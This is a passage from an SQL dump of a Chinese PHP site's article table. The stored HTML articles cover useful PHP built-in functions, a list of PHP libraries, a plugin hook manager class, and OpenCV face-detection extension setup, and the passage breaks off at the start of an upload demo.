/&gt;\r\n&lt;br /&gt;\r\n$pass_hash = md5(&quot;my-password&quot;, true); // PHP 5+这样做的好处之一是能减少串存储空间（能节省多少呢？可能又会是另篇文章了）。 &lt;br /&gt;\r\n&lt;br /&gt;\r\n这里还有个示例代码可以 pack 数组 via &lt;br /&gt;\r\n&amp;nbsp;&lt;/p&gt;\r\n&lt;div class=&quot;codetitle&quot;&gt;&lt;span style=&quot;cursor:pointer;&quot;&gt;&lt;u&gt;复制代码&lt;/u&gt;&lt;/span&gt; 代码如下:&lt;/div&gt;\r\n&lt;div id=&quot;code5267&quot; class=&quot;codebody&quot;&gt;&lt;br /&gt;\r\n&amp;lt;?php &lt;br /&gt;\r\nfunction pack_array($v,$a) { &lt;br /&gt;\r\nreturn call_user_func_array(pack,array_merge(array($v),(array)$a)); &lt;br /&gt;\r\n} &lt;br /&gt;\r\n&amp;nbsp;&lt;/div&gt;\r\n&lt;p&gt;&lt;br /&gt;\r\n&lt;strong&gt;cal_days_in_month() &lt;br /&gt;\r\n&lt;/strong&gt;&lt;br /&gt;\r\n该函数可以直接返回指定月份中的天数，例如 &lt;br /&gt;\r\n&lt;br /&gt;\r\n$days = cal_days_in_month(CAL_GREGORIAN, date(&quot;m&quot;), date(&quot;Y&quot;)); // 31我敢保证，你自己实现过类似功能的函数 :^) &lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;strong&gt;_()&lt;/strong&gt; &lt;br /&gt;\r\n呃，这的确也是个 PHP 函数（也有可能是最短的 PHP 内置函数）。_() 是它的“小名”，它的大名是 gettext()。 &lt;br /&gt;\r\n&lt;br /&gt;\r\n写过 Wordpress 皮肤的朋友会了解 __() 以及 _e() 这些函数，其实 PHP 早已经自带了相关的功能。 &lt;br /&gt;\r\n&amp;nbsp;&lt;/p&gt;\r\n&lt;div class=&quot;codetitle&quot;&gt;&lt;span style=&quot;cursor:pointer;&quot;&gt;&lt;u&gt;复制代码&lt;/u&gt;&lt;/span&gt; 代码如下:&lt;/div&gt;\r\n&lt;div id=&quot;code44788&quot; class=&quot;codebody&quot;&gt;&lt;br /&gt;\r\n// Set language to German &lt;br /&gt;\r\nsetlocale(LC_ALL, ''de_DE''); &lt;br /&gt;\r\n&lt;br /&gt;\r\n// Specify location of translation tables &lt;br /&gt;\r\nbindtextdomain(&quot;myPHPApp&quot;, &quot;./locale&quot;); &lt;br /&gt;\r\n&lt;br /&gt;\r\n// Choose domain &lt;br /&gt;\r\ntextdomain(&quot;myPHPApp&quot;); &lt;br /&gt;\r\n&lt;br /&gt;\r\necho _(&quot;Have a nice day&quot;); &lt;br /&gt;\r\n&amp;nbsp;&lt;/div&gt;\r\n&lt;p&gt;&lt;br /&gt;\r\n利用 gettext 可以编写多语言的应用，现在您感兴趣的可能就是如何编写 locale 文件，这但已经不是此文涉及的重点，更多信息可以移步到这里。 &lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;strong&gt;get_browser()&lt;/strong&gt; &lt;br /&gt;\r\n坦白讲，见到这个函数我当时就彻底泪奔。有了这个函数，再也不用自己去分析 $_SERVER[''HTTP_USER_AGENT''] 这个字符串了。 &lt;br /&gt;\r\n&lt;br /&gt;\r\n更多的信息可以参考这里。在使用此函数前，你可能需要个 browscap.ini 配置文件，相信你可以搞定的。 &lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;strong&gt;debug_print_backtrace()&lt;/strong&gt; &lt;br /&gt;\r\n以前查看函数调用堆栈，我会使用 xdebug 等的扩展，其实 PHP5 版本以后已经内置了相关的函数。 &lt;br /&gt;\r\n&lt;br /&gt;\r\n顺便再分享个“蛋疼”的小技巧，如果你记不住这个函数的名字，可以用这段代码同样能达到目的（看起来还是记住那个函数靠谱）： &lt;br /&gt;\r\n&amp;nbsp;&lt;/p&gt;\r\n&lt;div class=&quot;codetitle&quot;&gt;&lt;span style=&quot;cursor:pointer;&quot;&gt;&lt;u&gt;复制代码&lt;/u&gt;&lt;/span&gt; 代码如下:&lt;/div&gt;\r\n&lt;div id=&quot;code26225&quot; class=&quot;codebody&quot;&gt;&lt;br /&gt;\r\n&amp;lt;?php &lt;br /&gt;\r\n$e = new Exception(); &lt;br /&gt;\r\nprint_r(str_replace(''/path/to/code/'', '''', $e-&amp;gt;getTraceAsString()));natsort() &lt;br /&gt;\r\n这个函数用于自然排序，这个大家可能都要用到。贴下相关的文档链接以及示例代码 &lt;br /&gt;\r\n&lt;br /&gt;\r\n$items = array(&quot;100 apples&quot;, &quot;5 apples&quot;, &quot;110 apples&quot;, &quot;55 apples&quot;); &lt;br /&gt;\r\n&lt;br /&gt;\r\n// normal sorting: &lt;br /&gt;\r\nsort($items); &lt;br /&gt;\r\nprint_r($items); &lt;br /&gt;\r\n# Outputs: &lt;br /&gt;\r\n# Array &lt;br /&gt;\r\n# ( &lt;br /&gt;\r\n# [0] =&amp;gt; 100 apples &lt;br /&gt;\r\n# [1] =&amp;gt; 110 apples &lt;br /&gt;\r\n# [2] =&amp;gt; 5 apples &lt;br /&gt;\r\n# [3] =&amp;gt; 55 apples &lt;br /&gt;\r\n# ) &lt;br /&gt;\r\n&lt;br /&gt;\r\nnatsort($items); &lt;br /&gt;\r\nprint_r($items); &lt;br /&gt;\r\n# Outputs: &lt;br /&gt;\r\n# Array &lt;br /&gt;\r\n# ( &lt;br /&gt;\r\n# [2] =&amp;gt; 5 apples &lt;br /&gt;\r\n# [3] =&amp;gt; 55 apples &lt;br /&gt;\r\n# [0] =&amp;gt; 100 apples &lt;br /&gt;\r\n# [1] =&amp;gt; 110 apples &lt;br /&gt;\r\n# )有关自然排序的算法规则，可以参考这里的文档。 &lt;br /&gt;\r\n&amp;nbsp;&lt;/div&gt;\r\n&lt;p&gt;&lt;br /&gt;\r\nglob() &lt;br /&gt;\r\n这个函数的功能同样让人感到泪奔，先不说功能直接上示例代码 &lt;br /&gt;\r\n&amp;nbsp;&lt;/p&gt;\r\n&lt;div class=&quot;codetitle&quot;&gt;&lt;span style=&quot;cursor:pointer;&quot;&gt;&lt;u&gt;复制代码&lt;/u&gt;&lt;/span&gt; 代码如下:&lt;/div&gt;\r\n&lt;div id=&quot;code8472&quot; class=&quot;codebody&quot;&gt;&lt;br /&gt;\r\nforeach (glob(&quot;*.php&quot;) as $file) { &lt;br /&gt;\r\necho &quot;$file\\n&quot;; &lt;br /&gt;\r\n} &lt;br /&gt;\r\n&amp;nbsp;&lt;/div&gt;\r\n&lt;p&gt;&lt;br /&gt;\r\n相比你已经了解该函数的用途了，那么我们就可以有更多的“玩法”，例如就显示目录（via）： &lt;br /&gt;\r\n&lt;br /&gt;\r\n$dirs = array_filter(glob($path.''*''), ''is_dir'');当然，文件递归你也可以考虑使用下 SPL 扩展。 &lt;br /&gt;\r\n&lt;br /&gt;\r\n补充 by 神仙： &lt;br /&gt;\r\n&lt;br /&gt;\r\nglob 有个参数选项 GLOB_ONLYDIR 就可以只列目录PHP Filter &lt;br /&gt;\r\n如果你还在&lt;a style=&quot;color:blue;&quot; href=&quot;http://www.waweb.cn/article/slist-7-1.htm&quot; target=&quot;_blank&quot;&gt;jsp&lt;/a&gt;验证字符串，那么就真的“Out”了。自 PHP5.2 版本以后，内置了 PHP Fliter 模块用于专门验证 电子邮件、URL 等是否合法，示例代码： &lt;br /&gt;\r\n&lt;br /&gt;\r\nvar_dump(filter_var(''bob@example.com'', FILTER_VALIDATE_EMAIL));由于是新生的模块，因此还有很多的陷阱，例如 &lt;br /&gt;\r\n&lt;br /&gt;\r\nfilter_var(''abc'', FILTER_VALIDATE_BOOLEAN); // bool(false) &lt;br /&gt;\r\nfilter_var(''0'', FILTER_VALIDATE_BOOLEAN); // bool(false)但这不影响我们去尝试。有关 PHP Filter 的更多信息，相信能拎出来另外写篇文章了。 &lt;br /&gt;\r\n&lt;br /&gt;\r\n-- Split -- &lt;br /&gt;\r\n&lt;br /&gt;\r\n最后，感叹 PHP 其实是个历久弥新的工具，不小心我们就会悲剧性得重复造了只轮子。因此，时常看看 PHP 文档每次都会有新的收获。&lt;/p&gt;\r\n', 1, 1, 0, 0, 1302844356, 1, 'admin'),
(66, 1, '非常有用的PHP类库 加速php开发', '', '', '&lt;p style=&quot;text-align:left;&quot;&gt;&lt;strong&gt;图表库&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-align:left;&quot;&gt;下面的类库可以让你很简的创建复杂的图表和图片。当然，它们需要GD库的支持。&lt;/p&gt;\r\n&lt;p style=&quot;text-align:left;&quot;&gt;&lt;a title=&quot;pChart&quot; target=&quot;_blank&quot; href=&quot;http://pchart.sourceforge.net/&quot;&gt;&lt;font color=&quot;#993300&quot;&gt;pChart&lt;/font&gt;&lt;/a&gt; - 一个可以创建统计图的库。&lt;/p&gt;\r\n&lt;p style=&quot;text-align:left;&quot;&gt;&lt;a title=&quot;Libchart&quot; target=&quot;_blank&quot; href=&quot;http://naku.dohcrew.com/libchart/pages/introduction/&quot;&gt;&lt;font color=&quot;#993300&quot;&gt;Libchart&lt;/font&gt;&lt;/a&gt; - 这也是一个简单的统计图库。&lt;/p&gt;\r\n&lt;p style=&quot;text-align:left;&quot;&gt;&lt;a title=&quot;JpGraph&quot; target=&quot;_blank&quot; href=&quot;http://www.aditus.nu/jpgraph/&quot;&gt;&lt;font color=&quot;#993300&quot;&gt;JpGraph&lt;/font&gt;&lt;/a&gt; - 一个面向对象的图片创建类。&lt;/p&gt;\r\n&lt;p style=&quot;text-align:left;&quot;&gt;&lt;a title=&quot;Open Flash Chart&quot; target=&quot;_blank&quot; href=&quot;http://teethgrinder.co.uk/open-flash-chart/&quot;&gt;&lt;font color=&quot;#993300&quot;&gt;Open Flash Chart&lt;/font&gt;&lt;/a&gt; - 这是一个基于Flash的统计图。&lt;/p&gt;\r\n&lt;p style=&quot;text-align:left;&quot;&gt;&lt;strong&gt;RSS 解析&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-align:left;&quot;&gt;解释RSS并是一件很单调的事情，不过幸好你有下面的类库可以帮助你方便地读取RSS的Feed。&lt;/p&gt;\r\n&lt;p style=&quot;text-align:left;&quot;&gt;&lt;a title=&quot;MagpieRSS&quot; target=&quot;_blank&quot; href=&quot;http://magpierss.sourceforge.net/&quot;&gt;&lt;font color=&quot;#993300&quot;&gt;MagpieRSS&lt;/font&gt;&lt;/a&gt; - 开源的PHP版RSS解析器，据说功能强大，未验证。&lt;/p&gt;\r\n&lt;p style=&quot;text-align:left;&quot;&gt;&lt;a title=&quot;SimplePie&quot; target=&quot;_blank&quot; href=&quot;http://simplepie.org/&quot;&gt;&lt;font color=&quot;#993300&quot;&gt;SimplePie&lt;/font&gt;&lt;/a&gt; - 这是一个非常快速，而且易用的RSS和Atom 解析库。&lt;/p&gt;\r\n&lt;p style=&quot;text-align:left;&quot;&gt;&lt;strong&gt;缩略图生成&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-align:left;&quot;&gt;&lt;a title=&quot; phpThumb&quot; target=&quot;_blank&quot; href=&quot;http://phpthumb.sourceforge.net/&quot;&gt;&lt;font color=&quot;#993300&quot;&gt;phpThumb&lt;/font&gt;&lt;/a&gt; - 功能很强大，如何强大还是自己去体会吧。&lt;/p&gt;\r\n&lt;p style=&quot;text-align:left;&quot;&gt;&lt;strong&gt;支付&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-align:left;&quot;&gt;你的网站需要处理支付方面的事情？需要一个和支付网关的程序？下面这个程序可以帮到你。&lt;/p&gt;\r\n&lt;p style=&quot;text-align:left;&quot;&gt;&lt;a title=&quot;PHP Payment Library&quot; target=&quot;_blank&quot; href=&quot;http://www.phpfour.com/blog/2009/02/php-payment-gateway-library-for-paypal-authorizenet-and-2checkout/&quot;&gt;&lt;font color=&quot;#993300&quot;&gt;PHP Payment Library&lt;/font&gt;&lt;/a&gt; - 支持Paypal, Authorize.net 和2Checkout (2CO)&lt;/p&gt;\r\n&lt;p style=&quot;text-align:left;&quot;&gt;&lt;strong&gt;OpenID&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-align:left;&quot;&gt;&lt;a title=&quot;PHP-OpenID&quot; target=&quot;_blank&quot; href=&quot;http://www.openidenabled.com/php-openid/&quot;&gt;&lt;font color=&quot;#993300&quot;&gt;PHP-OpenID&lt;/font&gt;&lt;/a&gt; - 支持OpenID的一个PHP库。OpenID是帮助你使用相同的用户名和口令登录不同的网站的一种解决方案。如果你对OpenID不熟悉的话，你可以到这里看看：&lt;a href=&quot;http://openid.net.cn/&quot;&gt;&lt;font color=&quot;#993300&quot;&gt;http://openid.net.cn/&lt;/font&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-align:left;&quot;&gt;&lt;strong&gt;数据为抽象/对象关系映射ORM&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-align:left;&quot;&gt;&lt;a title=&quot;ADOdb&quot; target=&quot;_blank&quot; href=&quot;http://adodb.sourceforge.net/&quot;&gt;&lt;font color=&quot;#993300&quot;&gt;ADOdb&lt;/font&gt;&lt;/a&gt; - &lt;a style=&quot;color:blue;&quot; href=&quot;http://www.waweb.cn/dblist/db.htm&quot; target=&quot;_blank&quot;&gt;数据库&lt;/a&gt;抽象&lt;/p&gt;\r\n&lt;p style=&quot;text-align:left;&quot;&gt;&lt;a title=&quot;Doctrine&quot; target=&quot;_blank&quot; href=&quot;http://www.doctrine-project.org/&quot;&gt;&lt;font color=&quot;#993300&quot;&gt;Doctrine&lt;/font&gt;&lt;/a&gt; - 对象关系映射Object relational mapper (ORM) ，需要 PHP 5.2.3+ 版本，一个非常强大的database abstraction layer (DBAL).&lt;/p&gt;\r\n&lt;p style=&quot;text-align:left;&quot;&gt;&lt;a title=&quot;Propel&quot; target=&quot;_blank&quot; href=&quot;http://propel.phpdb.org/trac/&quot;&gt;&lt;font color=&quot;#993300&quot;&gt;Propel&lt;/font&gt;&lt;/a&gt; - 对象关系映射框架- PHP5&lt;/p&gt;\r\n&lt;p style=&quot;text-align:left;&quot;&gt;&lt;a title=&quot;Outlet&quot; target=&quot;_blank&quot; href=&quot;http://www.outlet-orm.org/site/&quot;&gt;&lt;font color=&quot;#993300&quot;&gt;Outlet&lt;/font&gt;&lt;/a&gt; - 也是关于对象关系映射的一个工具。&lt;/p&gt;\r\n&lt;p style=&quot;text-align:left;&quot;&gt;注：对象关系映射（Object Relational Mapping，简称ORM）是一种为了解决面向对象与关系&lt;a style=&quot;color:blue;&quot; href=&quot;http://www.waweb.cn/dblist/db.htm&quot; target=&quot;_blank&quot;&gt;数据库&lt;/a&gt;存在的互不匹配的现象的技术。 简单的说，ORM是通过使用描述对象和&lt;a style=&quot;color:blue;&quot; href=&quot;http://www.waweb.cn/dblist/db.htm&quot; target=&quot;_blank&quot;&gt;数据库&lt;/a&gt;之间映射的元数据，将程序中的对象自动持久化到关系&lt;a style=&quot;color:blue;&quot; href=&quot;http://www.waweb.cn/dblist/db.htm&quot; target=&quot;_blank&quot;&gt;数据库&lt;/a&gt;中。本质上就是将数据从一种形式转换到另外一种形式。 这也同时暗示者额外的执行开销；然而，如果ORM作为一种中间件实现，则会有很多机会做优化，而这些在手写的持久层并不存在。 更重要的是用于控制转换的元数据需要提供和管理；但是同样，这些花费要比维护手写的方案要少；而且就算是遵守ODMG规范的对象&lt;a style=&quot;color:blue;&quot; href=&quot;http://www.waweb.cn/dblist/db.htm&quot; target=&quot;_blank&quot;&gt;数据库&lt;/a&gt;依然需要类级别的元数据。&lt;/p&gt;\r\n&lt;p style=&quot;text-align:left;&quot;&gt;&lt;strong&gt;PDF 生成器&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-align:left;&quot;&gt;&lt;a title=&quot;FPDF&quot; target=&quot;_blank&quot; href=&quot;http://www.fpdf.org/&quot;&gt;&lt;font color=&quot;#993300&quot;&gt;FPDF&lt;/font&gt;&lt;/a&gt; - 这量一个可以让你生成PDF的纯PHP类库。&lt;/p&gt;\r\n&lt;p style=&quot;text-align:left;&quot;&gt;&lt;strong&gt;Excel 相关&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-align:left;&quot;&gt;你的站点需要生成Excel？没有问题，下面这两个类库可以让你轻松做到这一点。&lt;/p&gt;\r\n&lt;p style=&quot;text-align:left;&quot;&gt;&lt;a title=&quot;php-excel&quot; target=&quot;_blank&quot; href=&quot;http://code.google.com/p/php-excel/&quot;&gt;&lt;font color=&quot;#993300&quot;&gt;php-excel&lt;/font&gt;&lt;/a&gt; - 这是一个非常简单的Excel文件生成类。&lt;/p&gt;\r\n&lt;p style=&quot;text-align:left;&quot;&gt;&lt;a title=&quot;PHP Excel Reader&quot; target=&quot;_blank&quot; href=&quot;http://code.google.com/p/php-excel-reader/&quot;&gt;&lt;font color=&quot;#993300&quot;&gt;PHP Excel Reader&lt;/font&gt;&lt;/a&gt; - 可以解析并读取XLS文件中的数据。&lt;/p&gt;\r\n&lt;p style=&quot;text-align:left;&quot;&gt;&lt;strong&gt;E-Mail 相关&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-align:left;&quot;&gt;不喜欢PHP的mail函数？觉得不够强大？下面的PHP邮件相关的库绝对不会让你失望。&lt;/p&gt;\r\n&lt;p style=&quot;text-align:left;&quot;&gt;&lt;a title=&quot;Swift Mailer&quot; target=&quot;_blank&quot; href=&quot;http://swiftmailer.org/&quot;&gt;&lt;font color=&quot;#993300&quot;&gt;Swift Mailer&lt;/font&gt;&lt;/a&gt; - &lt;a style=&quot;color:blue;&quot; href=&quot;http://www.waweb.cn/freelist/free.htm&quot; target=&quot;_blank&quot;&gt;免费&lt;/a&gt;的超多功能的PHP邮件库。&lt;/p&gt;\r\n&lt;p style=&quot;text-align:left;&quot;&gt;&lt;a title=&quot;PHPMailer&quot; target=&quot;_blank&quot; href=&quot;http://phpmailer.codeworxtech.com/&quot;&gt;&lt;font color=&quot;#993300&quot;&gt;PHPMailer &lt;/font&gt;&lt;/a&gt;- 超强大的邮件发送类。&lt;/p&gt;\r\n&lt;h3 style=&quot;text-align:left;&quot;&gt;单元测试&lt;/h3&gt;\r\n&lt;p style=&quot;text-align:left;&quot;&gt;如果你在使用测试驱动的方法开发你的程序，下面的类库和框架绝你能帮助你的开发。&lt;/p&gt;\r\n&lt;p style=&quot;text-align:left;&quot;&gt;&lt;a title=&quot;SimpleTest&quot; target=&quot;_blank&quot; href=&quot;http://www.simpletest.org/&quot;&gt;&lt;font color=&quot;#993300&quot;&gt;SimpleTest&lt;/font&gt;&lt;/a&gt; - 一个PHP的单元测试和网页测试的框架。&lt;/p&gt;\r\n&lt;p style=&quot;text-align:left;&quot;&gt;&lt;a title=&quot;PHPUnit&quot; target=&quot;_blank&quot; href=&quot;http://www.phpunit.de/&quot;&gt;&lt;font color=&quot;#993300&quot;&gt;PHPUnit&lt;/font&gt;&lt;/a&gt; - 来自xUnit 家族，提供一个框架可以让你方便地进行单元测试的案例开发。并可非常容易地分析其测试结果。&lt;/p&gt;\r\n', 1, 1, 0, 0, 1302844510, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(67, 1, 'php实现网站插件机制的方法', '', '', '代码如下:&lt;div id=&quot;code70627&quot; class=&quot;codebody&quot;&gt;&lt;br /&gt;\r\n&amp;lt;? &lt;br /&gt;\r\n/** &lt;br /&gt;\r\n* STBLOG PluginManager Class &lt;br /&gt;\r\n* &lt;br /&gt;\r\n* 插件机制的实现核心类 &lt;br /&gt;\r\n* &lt;br /&gt;\r\n* @package STBLOG &lt;br /&gt;\r\n* @subpackage Libraries &lt;br /&gt;\r\n* @category Libraries &lt;br /&gt;\r\n* @author Saturn &lt;br /&gt;\r\n* @link http://www.cnsaturn.com/ &lt;br /&gt;\r\n*/ &lt;br /&gt;\r\nclass PluginManager &lt;br /&gt;\r\n{ &lt;br /&gt;\r\n/** &lt;br /&gt;\r\n* 监听已注册的插件 &lt;br /&gt;\r\n* &lt;br /&gt;\r\n* @access private &lt;br /&gt;\r\n* @var array &lt;br /&gt;\r\n*/ &lt;br /&gt;\r\nprivate $_listeners = array(); &lt;br /&gt;\r\n/** &lt;br /&gt;\r\n* 构造函数 &lt;br /&gt;\r\n* &lt;br /&gt;\r\n* @access public &lt;br /&gt;\r\n* @return void &lt;br /&gt;\r\n*/ &lt;br /&gt;\r\npublic function __construct() &lt;br /&gt;\r\n{ &lt;br /&gt;\r\n#这里$plugin数组包含我们获取已经由用户激活的插件信息 &lt;br /&gt;\r\n#为演示方便，我们假定$plugin中至少包含 &lt;br /&gt;\r\n#$plugin = array( &lt;br /&gt;\r\n# ''name'' =&amp;gt; ''插件名称'', &lt;br /&gt;\r\n# ''directory''=&amp;gt;''插件安装目录'' &lt;br /&gt;\r\n#); &lt;br /&gt;\r\n$plugins = get_active_plugins();#这个函数请自行实现 &lt;br /&gt;\r\nif($plugins) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\nforeach($plugins as $plugin) &lt;br /&gt;\r\n{//假定每个插件文件夹中包含一个actions.php文件，它是插件的具体实现 &lt;br /&gt;\r\nif (@file_exists(STPATH .''plugins/''.$plugin[''directory''].''/actions.php'')) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\ninclude_once(STPATH .''plugins/''.$plugin[''directory''].''/actions.php''); &lt;br /&gt;\r\n$class = $plugin[''name''].''_actions''; &lt;br /&gt;\r\nif (class_exists($class)) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\n//初始化所有插件 &lt;br /&gt;\r\nnew $class($this); &lt;br /&gt;\r\n} &lt;br /&gt;\r\n} &lt;br /&gt;\r\n} &lt;br /&gt;\r\n} &lt;br /&gt;\r\n#此处做些日志记录方面的东西 &lt;br /&gt;\r\n} &lt;br /&gt;\r\n/** &lt;br /&gt;\r\n* 注册需要监听的插件方法（钩子） &lt;br /&gt;\r\n* &lt;br /&gt;\r\n* @param string $hook &lt;br /&gt;\r\n* @param object $reference &lt;br /&gt;\r\n* @param string $method &lt;br /&gt;\r\n*/ &lt;br /&gt;\r\nfunction register($hook, &amp;amp;$reference, $method) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\n//获取插件要实现的方法 &lt;br /&gt;\r\n$key = get_class($reference).''-&amp;gt;''.$method; &lt;br /&gt;\r\n//将插件的引用连同方法push进监听数组中 &lt;br /&gt;\r\n$this-&amp;gt;_listeners[$hook][$key] = array(&amp;amp;$reference, $method); &lt;br /&gt;\r\n#此处做些日志记录方面的东西 &lt;br /&gt;\r\n} &lt;br /&gt;\r\n/** &lt;br /&gt;\r\n* 触发一个钩子 &lt;br /&gt;\r\n* &lt;br /&gt;\r\n* @param string $hook 钩子的名称 &lt;br /&gt;\r\n* @param mixed $data 钩子的入参 &lt;br /&gt;\r\n* @return mixed &lt;br /&gt;\r\n*/ &lt;br /&gt;\r\nfunction trigger($hook, $data='''') &lt;br /&gt;\r\n{ &lt;br /&gt;\r\n$result = ''''; &lt;br /&gt;\r\n//查看要实现的钩子，是否在监听数组之中 &lt;br /&gt;\r\nif (isset($this-&amp;gt;_listeners[$hook]) &amp;amp;&amp;amp; is_array($this-&amp;gt;_listeners[$hook]) &amp;amp;&amp;amp; count($this-&amp;gt;_listeners[$hook]) &amp;gt; 0) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\n// 循环调用开始 &lt;br /&gt;\r\nforeach ($this-&amp;gt;_listeners[$hook] as $listener) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\n// 取出插件对象的引用和方法 &lt;br /&gt;\r\n$class =&amp;amp; $listener[0]; &lt;br /&gt;\r\n$method = $listener[1]; &lt;br /&gt;\r\nif(method_exists($class,$method)) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\n// 动态调用插件的方法 &lt;br /&gt;\r\n$result .= $class-&amp;gt;$method($data); &lt;br /&gt;\r\n} &lt;br /&gt;\r\n} &lt;br /&gt;\r\n} &lt;br /&gt;\r\n#此处做些日志记录方面的东西 &lt;br /&gt;\r\nreturn $result; &lt;br /&gt;\r\n} &lt;br /&gt;\r\n} &lt;br /&gt;\r\n?&amp;gt;&lt;br /&gt;\r\n&amp;nbsp;&lt;/div&gt;\r\n&lt;p&gt;&lt;br /&gt;\r\n然后是插件的具体实现方法： &lt;br /&gt;\r\n&amp;nbsp;&lt;/p&gt;\r\n&lt;div class=&quot;codetitle&quot;&gt;&lt;span style=&quot;cursor:pointer;&quot;&gt;&lt;u&gt;复制代码&lt;/u&gt;&lt;/span&gt; 代码如下:&lt;/div&gt;\r\n&lt;div id=&quot;code62342&quot; class=&quot;codebody&quot;&gt;&lt;br /&gt;\r\n&amp;lt;? &lt;br /&gt;\r\n/** &lt;br /&gt;\r\n* 这是一个Hello World简单插件的实现 &lt;br /&gt;\r\n* &lt;br /&gt;\r\n* @package DEMO &lt;br /&gt;\r\n* @subpackage DEMO &lt;br /&gt;\r\n* @category Plugins &lt;br /&gt;\r\n* @author Saturn &lt;br /&gt;\r\n* @link http://www.cnsaturn.com/ &lt;br /&gt;\r\n*/ &lt;br /&gt;\r\n/** &lt;br /&gt;\r\n*需要注意的几个默认规则： &lt;br /&gt;\r\n* 1. 本插件类的文件名必须是action &lt;br /&gt;\r\n* 2. 插件类的名称必须是{插件名_actions} &lt;br /&gt;\r\n*/ &lt;br /&gt;\r\nclass DEMO_actions &lt;br /&gt;\r\n{ &lt;br /&gt;\r\n//解析函数的参数是pluginManager的引用 &lt;br /&gt;\r\nfunction __construct(&amp;amp;$pluginManager) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\n//注册这个插件 &lt;br /&gt;\r\n//第一个参数是钩子的名称 &lt;br /&gt;\r\n//第二个参数是pluginManager的引用 &lt;br /&gt;\r\n//第三个是插件所执行的方法 &lt;br /&gt;\r\n$pluginManager-&amp;gt;register(''demo'', $this, ''say_hello''); &lt;br /&gt;\r\n} &lt;br /&gt;\r\nfunction say_hello() &lt;br /&gt;\r\n{ &lt;br /&gt;\r\necho ''Hello World''; &lt;br /&gt;\r\n} &lt;br /&gt;\r\n} &lt;br /&gt;\r\n?&amp;gt;&lt;br /&gt;\r\n&amp;nbsp;&lt;/div&gt;\r\n&lt;p&gt;&lt;br /&gt;\r\n比如我要将say_hello放到我博客首页Index.php，那么你在index.php中的某个位置写下：（作者原话）&lt;br /&gt;\r\n&amp;nbsp;&lt;/p&gt;\r\n&lt;div class=&quot;codetitle&quot;&gt;&lt;span style=&quot;cursor:pointer;&quot;&gt;&lt;u&gt;复制代码&lt;/u&gt;&lt;/span&gt; 代码如下:&lt;/div&gt;\r\n&lt;div id=&quot;code40315&quot; class=&quot;codebody&quot;&gt;&lt;br /&gt;\r\n$pluginManager-&amp;gt;trigger(''demo'','''');&lt;br /&gt;\r\n&amp;nbsp;&lt;br /&gt;\r\n&lt;/div&gt;\r\n', 1, 1, 0, 0, 1302844794, 1, 'admin'),
(68, 1, '基于OpenCV的PHP图像人脸识别技术', '', '', 'openCV是一个开源的用C/C++开发的计算机图形图像库，非常强大，研究资料很齐全。本文重点是介绍如何使用php来调用其中的局部的功能。人脸侦查技术只是openCV一个应用分支。 &lt;br /&gt;\r\n1.安装 &lt;br /&gt;\r\n从源代码编译成一个动态的so文件。 &lt;br /&gt;\r\n1.1.安装 OpenCV (OpenCV 1.0.0) &lt;br /&gt;\r\n下载地址:http://sourceforge.net/project/showfiles.php?group_id=22870&amp;amp;package_id=16948 &lt;br /&gt;\r\n#tar xvzf OpenCV-1.0.0.tar.gz &lt;br /&gt;\r\n#cd opencv-1.0.0 &lt;br /&gt;\r\n#./configure &lt;br /&gt;\r\n#make &lt;br /&gt;\r\n#make install &lt;br /&gt;\r\n#make check (检查是否安装全部正确) &lt;br /&gt;\r\n提示： 不要指定安装路径，否则后面编译facedetect会找不到OpenCV的路径。 &lt;br /&gt;\r\n1.2 安装facedetect &lt;br /&gt;\r\n下载地址http://www.xarg.org/download/facedetect-1.0.0.tar.gz &lt;br /&gt;\r\n#tar xzvf facedetect-1.0.0.tar.gz &lt;br /&gt;\r\n#cd facedetect-1.0.0 &lt;br /&gt;\r\n#phpize &amp;amp;&amp;amp; ./configure &amp;amp;&amp;amp; make &amp;amp;&amp;amp; make install &lt;br /&gt;\r\n编译完之后会提示facedetect.so 文件所在的位置。 &lt;br /&gt;\r\n最后确认在php.ini加入 &lt;br /&gt;\r\nextension=facedetect.so，重启apache. &lt;br /&gt;\r\n2.函数使用 &lt;br /&gt;\r\n在phpinfo()里检查是否有facedetect这个模块。 &lt;br /&gt;\r\n从openCV源代码/data/haarcascades/里头取出所有xml文件放在php的执行目录下 &lt;br /&gt;\r\n//检查有多少个脸型 &lt;br /&gt;\r\nvar_dump(face_count(‘party.jpeg'', haarcascade_frontalface_alt.xml'')); &lt;br /&gt;\r\n//返回脸型在图片中的位置参数，多个则返回数组 &lt;br /&gt;\r\n$arr = face_detect(‘party.jpeg'', haarcascade_frontalface_alt2.xml''); &lt;br /&gt;\r\nprint_r($arr); &lt;br /&gt;\r\n3.应用 &lt;br /&gt;\r\n结合imagick可以将图片做一下应用。因为 face_detect只返回一个矩形参数，包含x，y坐标和w，h长宽参数。下面是我的一个应用demo &lt;br /&gt;\r\n&lt;div class=&quot;codetitle&quot;&gt;&lt;span style=&quot;cursor:pointer;&quot;&gt;&lt;u&gt;复制代码&lt;/u&gt;&lt;/span&gt; 代码如下:&lt;/div&gt;\r\n&lt;div class=&quot;codebody&quot; id=&quot;code96169&quot;&gt; &lt;br /&gt;\r\n&amp;lt;?php &lt;br /&gt;\r\nif($_FILES){ &lt;br /&gt;\r\n$img = 